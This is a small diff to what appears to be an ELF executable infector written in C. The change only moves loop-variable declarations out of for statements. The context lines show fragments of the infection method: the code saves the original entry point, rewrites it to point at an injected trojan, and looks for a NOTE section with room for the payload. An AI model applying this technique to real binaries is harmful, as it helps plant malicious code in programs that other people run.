@@ -49,7 +49,8 @@ static bool _inf_check_padding(unsigned char *buf, size_t len) {
 static long *_inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
 {
     uint8_t *ptr = trojan;
-    for (int i=0 ; i < len ; ++i) {
+    int i;
+    for (i=0 ; i < len ; ++i) {
         long curr = *((long *)&ptr[i]);
         /** is it the same? */
         if (!(match ^ curr))
@@ -125,7 +126,8 @@ elf_off_t inf_scan_segment(infect_t *inf) {
             data = inf->elfo->phdrs[idx0];
         }
     } else {
-        for (int i = 0; i < nr; ++i) {
+        int i;
+        for (i = 0; i < nr; ++i) {
             elf_word_t flags = inf->elfo->phdrs[i]->p_flags;
             if (flags == (PF_R|PF_X))
                 text = inf->elfo->phdrs[i];
@@ -170,6 +172,7 @@ bool inf_load_and_patch(infect_t *inf) {
 
     elf_off_t curr_sct_offset = 0;
     elf_shdr_t **shdrs = inf->elfo->shdrs;
+    int i;
 
     /** Save original entry point and re-write new one to ehdr */
     inf->lsb.o_entry = ehdr->e_entry;
@@ -178,7 +181,7 @@ bool inf_load_and_patch(infect_t *inf) {
     else if (ehdr->e_type == ET_DYN)
         ehdr->e_entry = inf->lsb.lsb_so_addr;
 
-    for (int i = 0; i < SHNUM(inf->elfo); ++i, (*shdrs)++) {
+    for (i = 0; i < SHNUM(inf->elfo); ++i, (*shdrs)++) {
         elf_shdr_t *shdr = *shdrs;
         curr_sct_offset = shdr->sh_offset + shdr->sh_size;
 
@@ -200,8 +203,9 @@ bool inf_load_and_patch(infect_t *inf) {
 static elf_shdr_t *_inf_get_largest_note(infect_t *inf, elf_word_t max) {
     elf_t *e = inf->elfo;
     elf_shdr_t *rv = NULL;
+    int i;
 
-    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr && !rv; ++i) {
+    for (i = 0; i < e->shmap[LAZY_SHT_NOTE].nr && !rv; ++i) {
         int idx = e->shmap[LAZY_SHT_NOTE].map[i];
         if (e->shdrs[idx]->sh_size == max)
             rv = e->shdrs[idx];
@@ -213,8 +217,9 @@ static elf_shdr_t *_inf_get_largest_note(infect_t *inf, elf_word_t max) {
 elf_xword_t inf_note_has_room_for_payload(infect_t *inf) {
     elf_t *e = inf->elfo;
     elf_xword_t max = 0;
+    int i;
 
-    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr; ++i) {
+    for (i = 0; i < e->shmap[LAZY_SHT_NOTE].nr; ++i) {
         int idx = e->shmap[LAZY_SHT_NOTE].map[i];
         if (e->shdrs[idx]->sh_size >= inf->trojan_size)
             max = e->shdrs[idx]->sh_size;
